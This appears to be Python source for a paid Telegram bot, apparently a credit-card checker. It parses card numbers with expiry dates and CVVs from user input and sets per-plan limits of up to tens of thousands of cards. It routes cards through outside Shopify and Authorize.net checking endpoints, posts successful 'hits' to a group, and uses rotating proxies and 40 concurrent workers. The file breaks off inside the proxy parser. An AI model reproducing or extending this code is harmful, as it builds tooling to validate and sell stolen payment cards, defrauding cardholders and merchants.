# ==============================================================================
# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘𝗠 (HIGH-SPEED CPM ENGINE)
# ==============================================================================
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import io
import sys
import logging
from html import unescape
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote 
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes, CommandHandler, Defaults
from telegram.error import RetryAfter, Conflict, TimedOut, NetworkError, Forbidden, BadRequest
from telegram.constants import ParseMode

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    get_all_user_proxies, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, mark_user_joined
)

# محرك تسجيل الأزرار وتمرير الخصائص الملونة والإيموجيات المتحركة بشكل رسمي لتليجرام
BUTTON_REGISTRY = {}
_original_inline_keyboard_button = telegram.InlineKeyboardButton

def CustomInlineKeyboardButton(*args, **kwargs):
    style = kwargs.pop('style', None)
    icon_custom_emoji_id = kwargs.pop('icon_custom_emoji_id', None)
    btn = _original_inline_keyboard_button(*args, **kwargs)
    if style or icon_custom_emoji_id:
        BUTTON_REGISTRY[id(btn)] = {'style': style, 'icon_custom_emoji_id': icon_custom_emoji_id}
    return btn

# ربط الكلاس المعدل بالمرجعين المحلي والعام لضمان تفعيل ميزات الأزرار الملونة والمتحركة
telegram.InlineKeyboardButton = CustomInlineKeyboardButton
InlineKeyboardButton = CustomInlineKeyboardButton

_original_to_dict = _original_inline_keyboard_button.to_dict
def _patched_to_dict(self, *args, **kwargs):
    d = _original_to_dict(self, *args, **kwargs)
    extra = BUTTON_REGISTRY.get(id(self))
    if extra:
        if extra.get('style'): d['style'] = extra['style']
        if extra.get('icon_custom_emoji_id'): d['icon_custom_emoji_id'] = extra['icon_custom_emoji_id']
    return d
_original_inline_keyboard_button.to_dict = _patched_to_dict

# Logging configuration
logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger("VIP_BOT")

# ====================== CONFIG & GLOBALS ======================
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808,8170592405").split(",") if x.strip()]

JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
HITS_GROUP_ID = os.getenv("HITS_GROUP_ID", "0").strip()

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
HITS_GROUP_LINK = os.getenv("HITS_GROUP_LINK", "").strip()

def get_valid_target(link, chat_id):
    l = str(link).strip()
    c = str(chat_id).strip()
    if "t.me/" in l and "+" not in l and "joinchat" not in l:
        uname = l.split("t.me/")[-1].split("/")[0].split("?")[0]
        return f"@{uname}"
    if l.startswith("@"): return l
    if c and c not in ["0", "", "none", "None"]:
        if c.isdigit(): c = f"-100{c}" 
        try: return int(c)
        except ValueError: return c
    return None

JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)

# روابط الـ APIs النشطة
SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

# التعديلات المطلوبة للسرعة والتشغيل
WORKERS = 40  
DELAY = 5.0  
HIT_DELAY = 1.0
API_TIMEOUT = 65

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 3
_JOIN_CACHE = {}
_MAINTENANCE_MODE = False

_USER_NAMES = {}
USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}

# ====================== SAFE CHARGED FONT ENGINE & TAG PROTECTION ======================
def sf(text) -> str:
    if text is None: return ""
    res = ""
    in_tag = False
    for c in str(text):
        if c == '<':
            in_tag = True
            res += c
            continue
        if c == '>':
            in_tag = False
            res += c
            continue
        if in_tag:
            res += c
            continue
            
        if 'A' <= c <= 'Z': res += chr(ord(c) - 65 + 0x1D5D4)
        elif 'a' <= c <= 'z': res += chr(ord(c) - 97 + 0x1D5EE)
        elif '0' <= c <= '9': res += chr(ord(c) - 48 + 0x1D7CE)
        else: res += c
    return res

def unsf(text) -> str:
    if text is None: return ""
    res = ""
    for c in str(text):
        o = ord(c)
        if 0x1D5D4 <= o <= 0x1D5ED: res += chr(o - 0x1D5D4 + 65)
        elif 0x1D5EE <= o <= 0x1D607: res += chr(o - 0x1D5EE + 97)
        elif 0x1D7CE <= o <= 0x1D7D7: res += chr(o - 0x1D7CE + 48)
        else: res += c
    return res

def escape_html(text):
    if not text: return "Unknown"
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ====================== NATIVE TELEGRAM PREMIUM CUSTOM EMOJIS ======================
CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
CE_DIAMOND2 = '<tg-emoji emoji-id="5260681660189408650">💎</tg-emoji>'
CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">🙂</tg-emoji>'
CE_CHART = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
CE_CONTAINER = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'
CE_CLOWN = CE_CONTAINER
CE_FLY = '<tg-emoji emoji-id="5231449120635370684">💸</tg-emoji>'
CE_SHIELD = '<tg-emoji emoji-id="5251203410396458957">🛡️</tg-emoji>'
CE_SEARCH = '<tg-emoji emoji-id="5231012545799666522">🔍</tg-emoji>'
switch_emoji = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
CE_SPARKLES = switch_emoji
CE_GAME = '<tg-emoji emoji-id="5361741454685256344">🎮</tg-emoji>'
CE_MEDAL = '<tg-emoji emoji-id="5440539497383087970">🥇</tg-emoji>'
CE_CALENDAR = '<tg-emoji emoji-id="5413879192267805083">🗓️</tg-emoji>'
CE_CLIP = '<tg-emoji emoji-id="5305265301917549162">📎</tg-emoji>'
CE_HOURGLASS = '<tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji>'
CE_STAR = '<tg-emoji emoji-id="5794073296492303710">⭐</tg-emoji>'
CE_THINK1 = '<tg-emoji emoji-id="5917785839428967062">🤔</tg-emoji>'
CE_THINK2 = '<tg-emoji emoji-id="5918248669399754192">🤔</tg-emoji>'
CE_THINK3 = '<tg-emoji emoji-id="5916025950809625537">🤔</tg-emoji>'
CE_ALIEN = '<tg-emoji emoji-id="6028356293540977715">👾</tg-emoji>'
CE_PHONE = '<tg-emoji emoji-id="5445059250382469069">📲</tg-emoji>'
CE_FLASH = '<tg-emoji emoji-id="5445388803223091254">⚡️</tg-emoji>'
CE_TEARS = '<tg-emoji emoji-id="6201792892634140208">🥲</tg-emoji>'
CE_SHY = '<tg-emoji emoji-id="6201647288947839133">🤭</tg-emoji>'
CE_CHECK = '<tg-emoji emoji-id="5445189224682779974"><b>✔️</b></tg-emoji>'
CE_DOWN = '<tg-emoji emoji-id="5445358884480916784">🔽</tg-emoji>'
CE_CARD = '<tg-emoji emoji-id="5447453226498552490">💳</tg-emoji>'
CE_MAIL = '<tg-emoji emoji-id="5445163772706582819">📬</tg-emoji>'
CE_MAN = '<tg-emoji emoji-id="5447311106030726740">👨‍🦰</tg-emoji>'

# ====================== CASH & STATUS EMOJIS ======================
CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯</tg-emoji>'
CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'

# ====================== ISO COUNTRIES TRANSLATION SYSTEM ======================
ISO3_TO_ISO2 = {
    "ABW": "AW", "AFG": "AF", "AGO": "AO", "AIA": "AI", "ALA": "AX", "ALB": "AL", "AND": "AD", "ARE": "AE",
    "ARG": "AR", "ARM": "AM", "ASM": "AS", "ATA": "AQ", "ATF": "TF", "ATG": "AG", "AUS": "AU", "AUT": "AT",
    "AZE": "AZ", "BDI": "BI", "BEL": "BE", "BEN": "BJ", "BES": "BQ", "BFA": "BF", "BGD": "BD", "BGR": "BG",
    "BHR": "BH", "BHS": "BS", "BIH": "BA", "BLM": "BL", "BLR": "BY", "BLZ": "BZ", "BMU": "BM", "BOL": "BO",
    "BRA": "BR", "BRB": "BB", "BRN": "BN", "BTN": "BT", "BVT": "BV", "BWA": "BW", "CAF": "CF", "CAN": "CA",
    "CCK": "CC", "CHE": "CH", "CHL": "CL", "CHN": "CN", "CIV": "CI", "CMR": "CM", "COD": "CD", "COG": "CG",
    "COK": "CK", "COL": "CO", "COM": "KM", "CPV": "CV", "CRI": "CR", "CUB": "CU", "CUW": "CW", "CXR": "CX",
    "CYM": "KY", "CYP": "CY", "CZE": "CZ", "DEU": "DE", "DJI": "DJ", "DMA": "DM", "DNK": "DK", "DOM": "DO",
    "DZA": "DZ", "ECU": "EC", "EGY": "EG", "ERI": "ER", "ESH": "EH", "ESP": "ES", "EST": "EE", "ETH": "ET",
    "FIN": "FI", "FJI": "FJ", "FLK": "FK", "FRA": "FR", "FRO": "FO", "FSM": "FM", "GAB": "GA", "GBR": "GB",
    "GEO": "GE", "GGY": "GG", "GHA": "GH", "GIB": "GI", "GIN": "GN", "GLP": "GP", "GMB": "GM", "GNB": "GW",
    "GNQ": "GQ", "GRC": "GR", "GRD": "GD", "GRL": "GL", "GTM": "GT", "GUF": "GF", "GUM": "GU", "GUY": "GY",
    "HKG": "HK", "HMD": "HM", "HND": "HN", "HRV": "HR", "HTI": "HT", "HUN": "HU", "IDN": "ID", "IMN": "IM",
    "IND": "IN", "IOT": "IO", "IRL": "IE", "IRN": "IR", "IRQ": "IQ", "ISL": "IS", "ISR": "IL", "ITA": "IT",
    "JAM": "JM", "JEY": "JE", "JOR": "JO", "JPN": "JP", "KAZ": "KZ", "KEN": "KE", "KGZ": "KG", "KHM": "KH",
    "KIR": "KI", "KNA": "KN", "KOR": "KR", "KWT": "KW", "LAO": "LA", "LBN": "LB", "LBR": "LR", "LBY": "LY",
    "LCA": "LC", "LIE": "LI", "LKA": "LK", "LSO": "LS", "LTU": "LT", "LUX": "LU", "LVA": "LV", "MAC": "MO",
    "MAF": "MF", "MAR": "MA", "MCO": "MC", "MDA": "MD", "MDG": "MG", "MDV": "MV", "MEX": "MX", "MHL": "MH",
    "MKD": "MK", "MLI": "ML", "MLT": "MT", "MMR": "MM", "MNE": "ME", "MNG": "MN", "MNP": "MP", "MOZ": "MZ",
    "MRT": "MR", "MSR": "MS", "MTQ": "MQ", "MUS": "MU", "MWI": "MW", "MYS": "MY", "MYT": "YT", "NAM": "NA",
    "NCL": "NC", "NER": "NE", "NFK": "NF", "NGA": "NG", "NIC": "NI", "NIU": "NU", "NLD": "NL", "NOR": "NO",
    "NPL": "NP", "NRU": "NR", "NZL": "NZ", "OMN": "OM", "PAK": "PK", "PAN": "PA", "PCN": "PN", "PER": "PE",
    "PHL": "PH", "PLW": "PW", "PNG": "PG", "POL": "PL", "PRI": "PR", "PRK": "KP", "PRT": "PT", "PRY": "PY",
    "PSE": "PS", "PYF": "PF", "QAT": "QA", "REU": "RE", "ROU": "RO", "RUS": "RU", "RWA": "RW", "SAU": "SA",
    "SDN": "SD", "SEN": "SN", "SGP": "SG", "SGS": "GS", "SHN": "SH", "SJM": "SJ", "SLB": "SB", "SLE": "SL",
    "SLV": "SV", "SMR": "SM", "SOM": "SO", "SPM": "PM", "SRB": "RS", "SSD": "SS", "STP": "ST", "SUR": "SR",
    "SVK": "SK", "SVN": "SI", "SWE": "SE", "SWZ": "SZ", "SXM": "SX", "SYC": "SC", "SYR": "SY", "TCA": "TC",
    "TCD": "TD", "TGO": "TG", "THA": "TH", "TJK": "TJ", "TKL": "TK", "TKM": "TM", "TLS": "TL", "TON": "TO",
    "TTO": "TT", "TUN": "TN", "TUR": "TR", "TUV": "TV", "TWN": "TW", "TZA": "TZ", "UGA": "UG", "UKR": "UA",
    "UMI": "UM", "URY": "UY", "USA": "US", "UZB": "UZ", "VAT": "VA", "VCT": "VC", "VEN": "VE", "VGB": "VG",
    "VIR": "VI", "VNM": "VN", "VUT": "VU", "WLF": "WF", "WSM": "WS", "YEM": "YE", "ZAF": "ZA", "ZMB": "ZM",
    "ZWE": "ZW"
}

COUNTRY_NAME_TO_CODE = {
    "AFGHANISTAN": "AF", "ALAND ISLANDS": "AX", "ALBANIA": "AL", "ALGERIA": "DZ", "AMERICAN SAMOA": "AS",
    "ANDORRA": "AD", "ANGOLA": "AO", "ANGUILLA": "AI", "ANTARCTICA": "AQ", "ANTIGUA AND BARBUDA": "AG",
    "ARGENTINA": "AR", "ARMENIA": "AM", "ARUBA": "AW", "AUSTRALIA": "AU", "AUSTRIA": "AT", "AZERBAIJAN": "AZ",
    "BAHAMAS": "BS", "BAHRAIN": "BH", "BANGLADESH": "BD", "BARBADOS": "BB", "BELARUS": "BY", "BELGIUM": "BE",
    "BELIZE": "BZ", "BENIN": "BJ", "BERMUDA": "BM", "BHUTAN": "BT", "BOLIVIA": "BO", "BOSNIA AND HERZEGOVINA": "BA",
    "BOTSWANA": "BW", "BOUVET ISLAND": "BV", "BRAZIL": "BR", "BRITISH INDIAN OCEAN TERRITORY": "IO",
    "BRUNEI DARUSSALAM": "BN", "BULGARIA": "BG", "BURKINA FASO": "BF", "BURUNDI": "BI", "CAMBODIA": "KH",
    "CAMEROON": "CM", "CANADA": "CA", "CAPE VERDE": "CV", "CAYMAN ISLANDS": "KY", "CENTRAL AFRICAN REPUBLIC": "CF",
    "CHAD": "TD", "CHILE": "CL", "CHINA": "CN", "CHRISTMAS ISLAND": "CX", "COCOS (KEELING) ISLANDS": "CC",
    "COLOMBIA": "CO", "COMOROS": "KM", "CONGO": "CG", "CONGO, THE DEMOCRATIC REPUBLIC OF THE": "CD",
    "COOK ISLANDS": "CK", "COSTA RICA": "CR", "COTE D'IVOIRE": "CI", "CROATIA": "HR", "CUBA": "CU", "CYPRUS": "CY",
    "CZECH REPUBLIC": "CZ", "CZECHIA": "CZ", "DENMARK": "DK", "DJIBOUTI": "DJ", "DOMINICA": "DM", "DOMINICAN REPUBLIC": "DO",
    "ECUADOR": "EC", "EGYPT": "EG", "EL SALVADOR": "SV", "EQUATORIAL GUINEA": "GQ", "ERITREA": "ER", "ESTONIA": "EE",
    "ETHIOPIA": "ET", "FALKLAND ISLANDS (MALVINAS)": "FK", "FAROE ISLANDS": "FO", "FIJI": "FJ", "FINLAND": "FI",
    "FRANCE": "FR", "FRENCH GUIANA": "GF", "FRENCH POLYNESIA": "PF", "FRENCH SOUTHERN TERRITORIES": "TF",
    "GABON": "GA", "GAMBIA": "GM", "GEORGIA": "GE", "GERMANY": "DE", "GHANA": "GH", "GIBRALTAR": "GI",
    "GREECE": "GR", "GREENLAND": "GL", "GRENADA": "GD", "GUADELOUPE": "GP", "GUAM": "GU", "GUATEMALA": "GT",
    "GUERNSEY": "GG", "GUINEA": "GN", "GUINEA-BISSAU": "GW", "GUYANA": "GY", "HAITI": "HT", "HEARD ISLAND AND MCDONALD ISLANDS": "HM",
    "HOLY SEE (VATICAN CITY STATE)": "VA", "VATICAN CITY": "VA", "HONDURAS": "HN", "HONG KONG": "HK", "HUNGARY": "HU", "ICELAND": "IS",
    "INDIA": "IN", "INDONESIA": "ID", "IRAN, ISLAMIC REPUBLIC OF": "IR", "IRAN": "IR", "IRAQ": "IQ", "IRELAND": "IE",
    "ISLE OF MAN": "IM", "ISRAEL": "IL", "ITALY": "IT", "JAMAICA": "JM", "JAPAN": "JP", "JERSEY": "JE",
    "JORDAN": "JO", "KAZAKHSTAN": "KZ", "KENYA": "KE", "KIRIBATI": "KI", "KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF": "KP",
    "KOREA, REPUBLIC OF": "KR", "SOUTH KOREA": "KR", "KOREA": "KR", "KUWAIT": "KW", "KYRGYZSTAN": "KG",
    "LAO PEOPLE'S DEMOCRATIC REPUBLIC": "LA", "LAOS": "LA", "LATVIA": "LV", "LEBANON": "LB", "LESOTHO": "LS",
    "LIBERIA": "LR", "LIBYAN ARAB JAMAHIRIYA": "LY", "LIBYA": "LY", "LIECHTENSTEIN": "LI", "LITHUANIA": "LT",
    "LUXEMBOURG": "LU", "MACAO": "MO", "MACAU": "MO", "MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF": "MK",
    "NORTH MACEDONIA": "MK", "MADAGASCAR": "MG", "MALAWI": "MW", "MALAYSIA": "MY", "MALDIVES": "MV",
    "MALI": "ML", "MALTA": "MT", "MARSHALL ISLANDS": "MH", "MARTINIQUE": "MQ", "MAURITANIA": "MR",
    "MAURITIUS": "MU", "MAYOTTE": "YT", "MEXICO": "MX", "MICRONESIA, FEDERATED STATES OF": "FM",
    "MOLDOVA, REPUBLIC OF": "MD", "MOLDOVA": "MD", "MONACO": "MC", "MONGOLIA": "MN", "MONTENEGRO": "ME",
    "MONTSERRAT": "MS", "MOROCCO": "MA", "MOZAMBIQUE": "MZ", "MYANMAR": "MM", "NAMIBIA": "NA", "NAURU": "NR",
    "NEPAL": "NP", "NETHERLANDS": "NL", "NETHERLANDS ANTILLES": "AN", "NEW CALEDONIA": "NC", "NEW ZEALAND": "NZ",
    "NICARAGUA": "NI", "NIGER": "NE", "NIGERIA": "NG", "NIUE": "NU", "NORFOLK ISLAND": "NF", "NORTHERN MARIANA ISLANDS": "MP",
    "NORWAY": "NO", "OMAN": "OM", "PAKISTAN": "PK", "PALAU": "PW", "PALESTINIAN TERRITORY, OCCUPIED": "PS",
    "PALESTINE": "PS", "PANAMA": "PA", "PAPUA NEW GUINEA": "PG", "PARAGUAY": "PY", "PERU": "PE",
    "PHILIPPINES": "PH", "PITCAIRN": "PN", "POLAND": "PL", "PORTUGAL": "PT", "PUERTO RICO": "PR",
    "QATAR": "QA", "REUNION": "RE", "ROMANIA": "RO", "RUSSIAN FEDERATION": "RU", "RUSSIA": "RU",
    "RWANDA": "RW", "SAINT HELENA": "SH", "SAINT KITTS AND NEVIS": "KN", "SAINT LUCIA": "LC",
    "SAINT PIERRE AND MIQUELON": "PM", "SAINT VINCENT AND THE GRENADINES": "VC", "SAMOA": "WS",
    "SAN MARINO": "SM", "SAO TOME AND PRINCIPE": "ST", "SAUDI ARABIA": "SA", "SENEGAL": "SN",
    "SERBIA": "RS", "SEYCHELLES": "SC", "SIERRA LEONE": "SL", "SINGAPORE": "SG", "SLOVAKIA": "SK",
    "SLOVENIA": "SI", "SOLOMON ISLANDS": "SB", "SOMALIA": "SO", "SOUTH AFRICA": "ZA",
    "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS": "GS", "SPAIN": "ES", "SRI LANKA": "LK",
    "SUDAN": "SD", "SURINAME": "SR", "SVALBARD AND JAN MAYEN": "SJ", "SWAZILAND": "SZ", "ESWATINI": "SZ",
    "SWEDEN": "SE", "SWITZERLAND": "CH", "SYRIAN ARAB REPUBLIC": "SY", "SYRIA": "SY", "TAIWAN, PROVINCE OF CHINA": "TW",
    "TAIWAN": "TW", "TAJIKISTAN": "TJ", "TKL": "TK", "TKM": "TM", "TLS": "TL", "TON": "TO", "TTO": "TT",
    "TUNISIA": "TN", "TURKEY": "TR", "TURKMENISTAN": "TM", "TURKS AND CAICOS ISLANDS": "TC", "TUVALU": "TV",
    "UGANDA": "UG", "UKRAINE": "UA", "UNITED ARAB EMIRATES": "AE", "UAE": "AE", "UNITED KINGDOM": "GB",
    "UNITED STATES": "US", "UNITED STATES OF AMERICA": "US", "USA": "US", "UK": "GB", "GB": "GB",
    "UNITED STATES MINOR OUTLYING ISLANDS": "UM", "URUGUAY": "UY", "UZBEKISTAN": "UZ", "VANUATU": "VU",
    "VENEZUELA": "VE", "VIET NAM": "VN", "VIETNAM": "VN", "VIRGIN ISLANDS, BRITISH": "VG",
    "VIRGIN ISLANDS, U.S.": "VI", "WALLIS AND FUTUNA": "WF", "WESTERN SAHARA": "EH", "YEMEN": "YE",
    "ZAMBIA": "ZM", "ZIMBABWE": "ZW"
}

def get_flag_emoji(country_code, fallback="🏳️"):
    if not country_code: return fallback
    c = str(country_code).upper().strip()
    if len(c) == 3:
        c = ISO3_TO_ISO2.get(c, c[:2])
    if c in ["-", "UNKNOWN", ""]: return fallback
    if len(c) != 2: return fallback
    try:
        return chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397)
    except Exception:
        return fallback

WELCOME_GIF = "https://i.giphy.com/3o7aD2d7hy9ktXNDP2.gif"
REDEEM_GIF = "https://i.giphy.com/l41YkxvU8c7J7Bba0.gif"

ANIME_GIFS = [
    "https://i.giphy.com/X3Yj4X96MK4wM.gif",        
    "https://i.giphy.com/3rVgN21VK2DuU.gif",        
    "https://i.giphy.com/MeE378J7w7bTq.gif",        
    "https://i.giphy.com/vlnZpsw8S_Z04.gif",        
    "https://i.giphy.com/3o7abIile68G58510k.gif",     
    "https://i.giphy.com/13m24iFmhomZi0.gif",        
    "https://i.giphy.com/l3vR1603ssT69vWb6.gif",        
    "https://i.giphy.com/XjY7D2H47Y0j6.gif",        
    "https://i.giphy.com/20K8866h4693G.gif",        
    "https://i.giphy.com/d3mlE7uhRoVX2Im4.gif"         
]

PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

_GIF_FILE_IDS = {}
_system_locks = {}
_BIN_CACHE = {}  

def get_system_lock(name: str):
    if name not in _system_locks: _system_locks[name] = asyncio.Lock()
    return _system_locks[name]

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Exception in update: {context.error}")

def is_valid_url(link):
    return link and str(link).strip().startswith("http")

async def fetch_gif_bytes(url):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {"User-Agent": "Mozilla/5.0"}
            async with session.get(url, headers=headers, timeout=15) as resp:
                if resp.status == 200:
                    bio = io.BytesIO(await resp.read())
                    bio.name = "animation.gif"
                    return bio
    except Exception as e: logger.error(f"Failed to fetch GIF: {e}")
    return None

async def send_forced_gif(target_func, text, markup, url):
    media_to_send = _GIF_FILE_IDS.get(url, url)
    for retry in range(4): 
        try:
            msg = await target_func(
                animation=media_to_send, caption=text, reply_markup=markup,
                parse_mode=ParseMode.HTML, read_timeout=40, write_timeout=40
            )
            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
                _GIF_FILE_IDS[url] = msg.animation.file_id
            return msg
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.5)
        except Exception:
            break
            
    try:
        gif_io = await fetch_gif_bytes(url)
        if gif_io:
            for retry in range(3):
                try:
                    msg = await target_func(
                        animation=gif_io, caption=text, reply_markup=markup,
                        parse_mode=ParseMode.HTML, read_timeout=60, write_timeout=60
                    )
                    if getattr(msg, 'animation', None):
                        _GIF_FILE_IDS[url] = msg.animation.file_id
                    return msg
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 0.5)
                except Exception:
                    break
    except Exception: pass

    try:
        if hasattr(target_func, '__self__') and hasattr(target_func.__self__, 'reply_text'):
            return await target_func.__self__.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
    except: pass
    return None

async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    target = update.callback_query.message if update.callback_query else update.message
    if not target: return None
    url = specific_gif or random.choice(ANIME_GIFS)
    if use_gif or specific_gif: return await send_forced_gif(target.reply_animation, text, markup, url)
    
    for retry in range(3):
        try: return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 0.5)
        except Exception: return None

async def styled_edit(msg, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    for retry in range(3):
        try:
            if getattr(msg, 'animation', None) or getattr(msg, 'photo', None) or getattr(msg, 'video', None) or getattr(msg, 'document', None): 
                return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode=ParseMode.HTML)
            return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.5)
        except Exception: 
            return None

async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    url = specific_gif or random.choice(ANIME_GIFS)
    async def _bot_send_anim(**kwargs): return await bot.send_animation(chat_id=chat_id, **kwargs)
    if use_gif or specific_gif: return await send_forced_gif(_bot_send_anim, text, markup, url)
    
    for retry in range(3):
        try: return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 0.5)
        except Exception: return None

async def load_keys():
    async with get_system_lock("keys"):
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r', encoding='utf-8') as f:
                    c = await f.read()
                    if c: return json.loads(c)
            except Exception: pass
        return {}

async def save_keys(keys_data):
    async with get_system_lock("keys"):
        try:
            async with aiofiles.open(KEYS_FILE, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(keys_data, indent=4))
        except Exception: pass

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 40000  
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000  
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
        connector = aiohttp.TCPConnector(limit=WORKERS + 20, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=300)
        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(connector=connector)
    return _USER_HTTP_SESSIONS[key]

async def cleanup_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except Exception: pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        y = '20' + y if len(y) == 2 else y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

# ====================== PROXY PARSER (EXCLUDES SOCKS) ======================
def parse_proxy_format(proxy):
    proxy = proxy.strip()
    
    if re.match(r'^socks', proxy, re.IGNORECASE):
        return None
        
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
    
    if 'socks' in pt:
        return None
        
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy): h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
